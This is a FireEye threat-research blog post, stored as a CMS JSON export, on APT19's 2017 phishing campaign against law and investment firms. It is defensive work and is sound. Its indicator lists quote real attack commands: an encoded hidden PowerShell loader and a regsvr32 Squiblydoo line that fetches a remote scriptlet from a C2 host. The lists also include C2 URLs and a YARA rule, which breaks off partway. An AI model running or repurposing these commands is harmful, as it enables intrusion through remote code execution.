{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "admin",
  "jcr:created": "Tue Jun 06 2017 18:29:21 GMT-0400",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "admin",
    "jcr:title": "Privileges and Credentials: Phished at the Request of Counsel",
    "cq:lastReplicationAction": "Activate",
    "jcr:versionHistory": "4e8c957a-3e4d-4787-a1f4-12b4fad7bbe7",
    "author": "Ian Ahl",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "cq:lastReplicatedBy": "lynda.hall@fireeye.com",
    "jcr:language": "en_us",
    "jcr:predecessors": [
      "2a7514e5-e43a-43d6-b87e-60d0dea919fc"
    ],
    "jcr:created": "Tue May 14 2019 17:47:12 GMT-0400",
    "cq:lastReplicated": "Tue May 14 2019 17:47:09 GMT-0400",
    "cq:lastModified": "Tue May 14 2019 17:46:53 GMT-0400",
    "cq:distribute": true,
    "jcr:baseVersion": "2a7514e5-e43a-43d6-b87e-60d0dea919fc",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-blog-authors:cap-ian-ahl",
      "fireeye-blog-threat-research:threat-research",
      "fireeye-doctypes:blog",
      "fireeye-blog-tags:homepage-carousel",
      "fireeye-blog-tags:latest",
      "fireeye-blog-tags:phishing"
    ],
    "jcr:uuid": "df6b7717-c5e7-4018-bded-3788402e5def",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Tue Jun 06 2017 18:30:00 GMT-0400",
    "_charset_": "UTF-8",
    "cq:lastModifiedBy": "lynda.hall@fireeye.com",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:lastModifiedBy": "lynda.hall@fireeye.com",
        "text": "\u003Ch4\u003ESummary\u003C\/h4\u003E\n\u003Cp\u003EIn May and June 2017, FireEye observed a phishing campaign targeting at least seven global law and investment firms. We have associated this campaign with APT19, a group that we assess is composed of freelancers, with some degree of sponsorship by the Chinese government.\u003C\/p\u003E\n\u003Cp\u003EAPT19 used three different techniques to attempt to compromise targets. In early May, the phishing lures leveraged RTF attachments that exploited the Microsoft Windows vulnerability described in \u003Ca href=\u0022https:\/\/www.fireeye.com\/blog\/threat-research\/2017\/04\/cve-2017-0199-hta-handler.html\u0022\u003ECVE 2017-0199\u003C\/a\u003E. Toward the end of May, APT19 switched to using macro-enabled Microsoft Excel (XLSM) documents. In the most recent versions, APT19 added an application whitelisting bypass to the XLSM documents. At least one observed phishing lure delivered a Cobalt Strike payload.\u003C\/p\u003E\n\u003Cp\u003EAs of the writing of this blog post, FireEye had not observed post-exploitation activity by the threat actors, so we cannot assess the goal of the campaign. We have previously observed APT19 steal data from law and investment firms for competitive economic purposes.\u003C\/p\u003E\n\u003Cp\u003EThis purpose of this blog post is to inform law firms and investment firms of this phishing campaign and provide technical indicators that their IT personnel can use for proactive hunting and detection.\u003C\/p\u003E\n\u003Ch4\u003EThe Emails\u003C\/h4\u003E\n\u003Cp\u003EAPT19 phishing emails from this campaign originated from sender email accounts from the \u0026quot;@cloudsend[.]net\u0026quot; domain and used a variety of subjects and attachment names. Refer to the Indicators of Compromise section for more details.\u003C\/p\u003E\n\u003Ch4\u003EThe Attachments\u003C\/h4\u003E\n\u003Cp\u003EAPT19 leveraged Rich Text Format (RTF) and macro-enabled Microsoft Excel (XLSM) files to deliver their initial exploits. The following sections describe the two methods in further detail.\u003C\/p\u003E\n\u003Ch5\u003ERTF Attachments\u003C\/h5\u003E\n\u003Cp\u003EThrough the exploitation of the HTA handler vulnerability described in \u003Ca href=\u0022https:\/\/www.fireeye.com\/blog\/threat-research\/2017\/04\/cve-2017-0199-hta-handler.html\u0022\u003ECVE-2017-1099\u003C\/a\u003E, the observed RTF attachments download hxxp:\/\/tk-in-f156.2bunny[.]com\/Agreement.doc. Unfortunately, this file was no longer hosted at tk-in-f156.2bunny[.]com for further analysis. Figure 1 is a screenshot of a packet capture showing one of the RTF files reaching out to hxxp:\/\/tk-in-f156.2bunny[.]com\/Agreement.doc.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/Lawyer%20phishing\/Fig1.png\u0022\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 1: RTF PCAP\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch5\u003EXLSM Attachments\u003C\/h5\u003E\n\u003Cp\u003EThe XLSM attachments contained multiple worksheets with content that reflected the attachment name. The attachments also contained an image that requested the user to \u201cEnable Content\u201d, which would enable macro support if it was disabled. Figure 2 provides a screenshot of one of the XLSM files (MD5:30f149479c02b741e897cdb9ecd22da7).\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/Lawyer%20phishing\/Fig2.png\u0022\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 2: Enable macros\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EOne of the malicious XLSM attachments that we observed contained a macro that:\u003C\/p\u003E\n\u003Col\u003E\n\u003Cli\u003EDetermined the system architecture to select the correct path for PowerShell\u003C\/li\u003E\n\u003Cli\u003ELaunched a ZLIB compressed and Base64 encoded command with PowerShell. This is a typical technique used by Meterpreter stagers.\u003C\/li\u003E\n\u003C\/ol\u003E\n\u003Cp\u003EFigure 3 depicts the macro embedded within the XLSM file (MD5: 38125a991efc6ab02f7134db0ebe21b6).\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/Lawyer%20phishing\/Fig3.png\u0022\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 3: XLSX Macro\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 4 contains the decoded output of the encoded text.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/Lawyer%20phishing\/Fig4.png\u0022\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 4: Decoded ZLIB + Base64 payload\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe shellcode invokes PowerShell to issue a HTTP GET request for a random four (4) character URI on the root of autodiscovery[.]2bunny[.]com. The requests contain minimal HTTP headers since the PowerShell command is executed with mostly default parameters. Figure 5 depicts an HTTP GET request generated by the payload, with minimal HTTP headers.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/Lawyer%20phishing\/Fig5.png\u0022\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 5: GET Request with minimal HTTP headers\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EConverting the shellcode to ASCII and removing the non-printable characters provides a quick way to pull out network-based indicators (NBI) from the shellcode. Figure 6 shows the extracted NBIs.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/Lawyer%20phishing\/Fig6.png\u0022\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 6: Decoded shellcode\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EFireEye also identified an alternate macro in some of the XLSM documents, displayed in Figure 7.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/Lawyer%20phishing\/Fig7.png\u0022\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 7: Alternate macro\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThis macro uses Casey Smith\u2019s \u201cSquiblydoo\u201d Application Whitelisting bypass technique to run the command in Figure 8.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/Lawyer%20phishing\/Fig8.png\u0022\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 8: Application Whitelisting Bypass\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe command in Figure 8 downloads and launches code within an SCT file. The SCT file in the payload (MD5: 1554d6fe12830ae57284b389a1132d65) contained the code shown in Figure 9.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/Lawyer%20phishing\/Fig9.png\u0022\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 9: SCT contents\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 10 provides the decoded script. Notice the \u201c$DoIt\u201d string, which is usually indicative of a Cobalt Strike payload.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/Lawyer%20phishing\/Fig10.png\u0022\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 10: Decoded SCT contents\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EA quick conversion of the contents of the variable \u201c$var_code\u201d from Base64 to ASCII shows some familiar network indicators, shown in Figure 11.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/Lawyer%20phishing\/Fig11.png\u0022\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 11: $var_code to ASCII\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003ESecond Stage Payload\u003C\/h4\u003E\n\u003Cp\u003EOnce the XLSM launches its PowerShell command, it downloads a typical Cobalt Strike BEACON payload, configured with the following parameters:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EProcess Inject Targets:\u003Cul\u003E\n\u003Cli\u003E%windir%\\syswow64\\rundll32.exe\u003C\/li\u003E\n\u003Cli\u003E%windir%\\sysnative\\rundll32.exe\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003Ec2_user_agents\u003Cul\u003E\n\u003Cli\u003EMozilla\/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident\/5.0; FunWebProducts; IE0006_ver1;EN_GB)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003ENamed Pipes\u003Cul\u003E\n\u003Cli\u003E\\\\%s\\pipe\\msagent_%x\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003Ebeacon_interval\u003Cul\u003E\n\u003Cli\u003E60\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003EC2\u003Cul\u003E\n\u003Cli\u003Eautodiscover.2bunny[.]com\/submit.php\u003C\/li\u003E\n\u003Cli\u003Eautodiscover.2bunny[.]com\/IE9CompatViewList.xml\u003C\/li\u003E\n\u003Cli\u003Esfo02s01-in-f2.cloudsend[.]net\/submit.php\u003C\/li\u003E\n\u003Cli\u003Esfo02s01-in-f2.cloudsend[.]net\/IE9CompatViewList.xml\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003EC2 Port\u003Cul\u003E\n\u003Cli\u003ETCP\/80\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EFigure 12 depicts an example of a BEACON C2 attempt from this payload.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/Lawyer%20phishing\/Fig12.png\u0022\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 12: Cobalt Strike BEACON C2\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EFireEye Product Detections\u003C\/h4\u003E\n\u003Cp\u003EThe following FireEye products currently detect and block the methods described above. Table 1 lists the current detection and blocking capabilities by product.\u003C\/p\u003E\n\u003Ctable width=\u0022499\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 border=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022252\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003E\u003Cb\u003EDetection Name\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002246\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003E\u003Cb\u003EProduct\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002241\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EAction\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022161\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003E\u003Cb\u003ENotes\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022252\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003ESUSPICIOUS POWERSHELL USAGE (METHODOLOGY)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002246\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003EHX\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002241\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EDetect\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022161\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003EXSLM Macro launch\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022252\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003EGen:Variant.Application.HackTool.CobaltStrike.1\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002246\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003EHX\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002241\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EDetect\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022161\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003EXSLM Macro launch\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022252\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003EMalware Object\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002246\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003EHX\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002241\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EDetect\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022161\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003EBEACON written to disk\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022252\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003EBackdoor.BEACON\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002246\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003ENX\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002241\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EBlock*\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022161\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003EBEACON Callback\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022252\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003EFE_Malformed_RTF\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002246\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003EEX\/ETP\/NX\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002241\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EBlock*\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022161\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003ERTF\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022252\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003EMalware.Binary.rtf\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002246\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003EEX\/ETP\/NX\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002241\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EBlock*\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022161\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003ERTF\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022252\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003EMalware.Binary\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002246\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003EEX\/ETP\/NX\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002241\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EBlock*\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022161\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003ERTF\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022252\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003EMalware.Binary.xlsx\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002246\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003EEX\/ETP\/NX\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u002241\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EBlock*\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022161\u0022 valign=\u0022bottom\u0022\u003E\u003Cp\u003EXSLM\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003ETable 1: Detection review\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003E*Appliances must be configured for block mode.\u003C\/i\u003E\u003C\/p\u003E\n\u003Ch4\u003ERecommendations\u003C\/h4\u003E\n\u003Cp\u003EFireEye recommends organizations perform the following steps to mitigate the risk of this campaign:\u003C\/p\u003E\n\u003Col\u003E\n\u003Cli\u003EMicrosoft Office users should apply the\u0026nbsp;\u003Ca href=\u0022https:\/\/portal.msrc.microsoft.com\/en-US\/security-guidance\/advisory\/CVE-2017-0199\u0022\u003Epatch from Microsoft\u003C\/a\u003E as soon as possible, if they have not already installed it.\u003C\/li\u003E\n\u003Cli\u003ESearch historic and future emails that match the included indicators of compromise.\u003C\/li\u003E\n\u003Cli\u003EReview web proxy logs for connections to the included network based indicators of compromise.\u003C\/li\u003E\n\u003Cli\u003EBlock connections to the included fully qualified domain names.\u003C\/li\u003E\n\u003Cli\u003EReview endpoints for the included host based indicators of compromise.\u003C\/li\u003E\n\u003C\/ol\u003E\n\u003Ch4\u003EIndicators of Compromise\u003C\/h4\u003E\n\u003Cp\u003EThe following section provides the IOCs for the variants of the phishing emails and malicious payloads that FireEye has observed during this campaign.\u003C\/p\u003E\n\u003Ch5\u003EEmail Senders\u003C\/h5\u003E\n\u003Cul\u003E\n\u003Cli\u003EPressReader \u0026lt;infodept@cloudsend[.]net\u0026gt;\u003C\/li\u003E\n\u003Cli\u003EAngela Suh \u0026lt;angela.suh@cloudsend[.]net\u0026gt;\u003C\/li\u003E\n\u003Cli\u003EAshley Safronoff \u0026lt;ashley.safronoff@cloudsend[.]net\u0026gt;\u003C\/li\u003E\n\u003Cli\u003ELindsey Hersh \u0026lt;lindsey.hersh@cloudsend[.]net\u0026gt;\u003C\/li\u003E\n\u003Cli\u003ESarah Roberto sarah.roberto@cloudsend[.]net\u003C\/li\u003E\n\u003Cli\u003Enoreply@cloudsend[.]net\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch5\u003EEmail Subject Lines\u003C\/h5\u003E\n\u003Cul\u003E\n\u003Cli\u003EMacron Denies Authenticity Of Leak, French Prosecutors Open Probe\u003C\/li\u003E\n\u003Cli\u003EMacron Document Leaker Releases New Images, Promises More Information\u003C\/li\u003E\n\u003Cli\u003EAre Emmanuel Macron\u0027s Tax Evasion Documents Real?\u003C\/li\u003E\n\u003Cli\u003ETime Allocation\u003C\/li\u003E\n\u003Cli\u003EVacancy Report\u003C\/li\u003E\n\u003Cli\u003Echina paper table and graph\u003C\/li\u003E\n\u003Cli\u003Eresults with zeros \u2013 some ready not all finished\u003C\/li\u003E\n\u003Cli\u003EMacron Leaks contain secret plans for the islamisation of France and Europe\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch5\u003EAttachment Names\u003C\/h5\u003E\n\u003Cul\u003E\n\u003Cli\u003EMacron_Authenticity.doc.rtf\u003C\/li\u003E\n\u003Cli\u003EMacron_Information.doc.rtf\u003C\/li\u003E\n\u003Cli\u003EUS and EU Trade with China and China CA.xlsm\u003C\/li\u003E\n\u003Cli\u003ETables 4 5 7 Appendix with zeros.xlsm\u003C\/li\u003E\n\u003Cli\u003EProject Codes - 05.30.17.xlsm\u003C\/li\u003E\n\u003Cli\u003EWeekly Vacancy Status Report 5-30-15.xlsm\u003C\/li\u003E\n\u003Cli\u003EMacron_Tax_Evasion.doc.rtf\u003C\/li\u003E\n\u003Cli\u003EMacron_secret_plans.doc.rtf\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch5\u003ENetwork Based Indicators (NBI)\u003C\/h5\u003E\n\u003Cul\u003E\n\u003Cli\u003Elyncdiscover.2bunny[.]com\u003C\/li\u003E\n\u003Cli\u003Eautodiscover.2bunny[.]com\u003C\/li\u003E\n\u003Cli\u003Elyncdiscover.2bunny[.]com:443\/Autodiscover\/AutodiscoverService\/\u003C\/li\u003E\n\u003Cli\u003Elyncdiscover.2bunny[.]com\/Autodiscover\u003C\/li\u003E\n\u003Cli\u003Eautodiscover.2bunny[.]com\/K5om\u003C\/li\u003E\n\u003Cli\u003Esfo02s01-in-f2.cloudsend[.]net\/submit.php\u003C\/li\u003E\n\u003Cli\u003Esfo02s01-in-f2.cloudsend[.]net\/IE9CompatViewList.xml\u003C\/li\u003E\n\u003Cli\u003Etk-in-f156.2bunny[.]com\u003C\/li\u003E\n\u003Cli\u003Etk-in-f156.2bunny[.]com\/Agreement.doc\u003C\/li\u003E\n\u003Cli\u003E104.236.77[.]169\u003C\/li\u003E\n\u003Cli\u003E138.68.45[.]9\u003C\/li\u003E\n\u003Cli\u003E162.243.143[.]145\u003C\/li\u003E\n\u003Cli\u003EMozilla\/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident\/5.0; FunWebProducts; IE0006_ver1;EN_GB)\u003C\/li\u003E\n\u003Cli\u003Etf-in-f167.2bunny[.]com:443 (*Only seen in VT not ITW)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch5\u003EHost Based Indicators (HBI)\u003C\/h5\u003E\n\u003Cp\u003E\u003Cu\u003ERTF MD5 hash values\u003C\/u\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E0bef39d0e10b1edfe77617f494d733a8\u003C\/li\u003E\n\u003Cli\u003E0e6da59f10e1c4685bb5b35a30fc8fb6\u003C\/li\u003E\n\u003Cli\u003Ecebd0e9e05749665d893e78c452607e2\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cu\u003EXLSX MD5 hash values\u003C\/u\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E38125a991efc6ab02f7134db0ebe21b6\u003C\/li\u003E\n\u003Cli\u003E3a1dca21bfe72368f2dd46eb4d9b48c4\u003C\/li\u003E\n\u003Cli\u003E30f149479c02b741e897cdb9ecd22da7\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cu\u003EBEACON and Meterpreter payload MD5 hash values\u003C\/u\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003Ebae0b39197a1ac9e24bdf9a9483b18ea\u003C\/li\u003E\n\u003Cli\u003E1151619d06a461456b310096db6bc548\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cu\u003EProcess arguments, named pipes, and file paths\u003C\/u\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003Epowershell.exe -NoP -NonI -W Hidden -Command \u0026quot;Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\u0026quot;\u0026lt;base64 blob\u0026gt;\u0026quot;)\u003C\/li\u003E\n\u003Cli\u003Eregsvr32.exe \/s \/n \/u \/i:hxxps:\/\/lyncdiscover.2bunny.com\/Autodiscover scrobj.dll\u003C\/li\u003E\n\u003Cli\u003E\\\\\u0026lt;ip\u0026gt;\\pipe\\msagent_\u0026lt;4 digits\u0026gt;\u003C\/li\u003E\n\u003Cli\u003EC:\\Documents and Settings\\\u0026lt;user\u0026gt;\\Local Settings\\Temp\\K5om.dll (4 character DLL based on URI of original GET request)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch5\u003EYara Rules\u003C\/h5\u003E\n\u003Ctable cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022600\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Erule FE_LEGALSTRIKE_MACRO {\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;meta:version=\u0026quot;.1\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;filetype=\u0026quot;MACRO\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;author=\u0026quot;Ian.Ahl@fireeye.com @TekDefense\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;date=\u0026quot;2017-06-02\u0026quot;\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;description=\u0026quot;This rule is designed to identify macros with the specific encoding used in the sample 30f149479c02b741e897cdb9ecd22da7.\u0026quot;\u003Cbr\u003E\nstrings:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;\/\/ OBSFUCATION\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$ob1 = \u0026quot;ChrW(114) \u0026amp; ChrW(101) \u0026amp; ChrW(103) \u0026amp; ChrW(115) \u0026amp; ChrW(118) \u0026amp; ChrW(114) \u0026amp; ChrW(51) \u0026amp; ChrW(50) \u0026amp; ChrW(46) \u0026amp; ChrW(101)\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$ob2 = \u0026quot;ChrW(120) \u0026amp; ChrW(101) \u0026amp; ChrW(32) \u0026amp; ChrW(47) \u0026amp; ChrW(115) \u0026amp; ChrW(32) \u0026amp; ChrW(47) \u0026amp; ChrW(110) \u0026amp; ChrW(32) \u0026amp; ChrW(47)\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$ob3 = \u0026quot;ChrW(117) \u0026amp; ChrW(32) \u0026amp; ChrW(47) \u0026amp; ChrW(105) \u0026amp; ChrW(58) \u0026amp; ChrW(104) \u0026amp; ChrW(116) \u0026amp; ChrW(116) \u0026amp; ChrW(112) \u0026amp; ChrW(115)\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$ob4 = \u0026quot;ChrW(58) \u0026amp; ChrW(47) \u0026amp; ChrW(47) \u0026amp; ChrW(108) \u0026amp; ChrW(121) \u0026amp; ChrW(110) \u0026amp; ChrW(99) \u0026amp; ChrW(100) \u0026amp; ChrW(105) \u0026amp; ChrW(115)\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$ob5 = \u0026quot;ChrW(99) \u0026amp; ChrW(111) \u0026amp; ChrW(118) \u0026amp; ChrW(101) \u0026amp; ChrW(114) \u0026amp; ChrW(46) \u0026amp; ChrW(50) \u0026amp; ChrW(98) \u0026amp; ChrW(117) \u0026amp; ChrW(110)\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$ob6 = \u0026quot;ChrW(110) \u0026amp; ChrW(121) \u0026amp; ChrW(46) \u0026amp; ChrW(99) \u0026amp; ChrW(111) \u0026amp; ChrW(109) \u0026amp; ChrW(47) \u0026amp; ChrW(65) \u0026amp; ChrW(117) \u0026amp; ChrW(116)\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$ob7 = \u0026quot;ChrW(111) \u0026amp; ChrW(100) \u0026amp; ChrW(105) \u0026amp; ChrW(115) \u0026amp; ChrW(99) \u0026amp; ChrW(111) \u0026amp; ChrW(118) \u0026amp; ChrW(101) \u0026amp; ChrW(114) \u0026amp; ChrW(32)\u0026quot; ascii wide\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;$ob8 = 